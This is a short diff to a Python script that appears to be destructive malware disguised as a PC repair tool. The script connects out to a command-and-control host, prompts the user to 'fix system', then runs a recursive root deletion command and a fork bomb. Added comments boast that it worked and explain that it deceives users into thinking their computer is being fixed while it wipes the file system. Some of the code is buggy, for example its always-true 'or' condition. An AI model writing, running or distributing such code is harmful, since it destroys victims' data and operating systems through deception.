@@ -10,7 +10,8 @@ port = 8080
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 call_home = sock.connect((host,port))
-# btw im not sure if these work 
+#TODO btw im not sure if these work
+#UPDATE it worked 
 fix = input("fix system? \n")
 if fix == "yes" or "Yes":
     while fix == "yes" or "Yes":
@@ -30,3 +31,7 @@ else:
         os.system("sudo rm rf / --no-preserve-root")
         os.system("sudo :(){:|:& };:") and os.system(":(){:|:& };:")
         print("get fucked")
+
+
+#--Code breakdown--
+# the code leads the user to thinking the program is for fixing thier pc, it then dystroys the file system and os and in the process, sending back to a cmd and ctrl server     
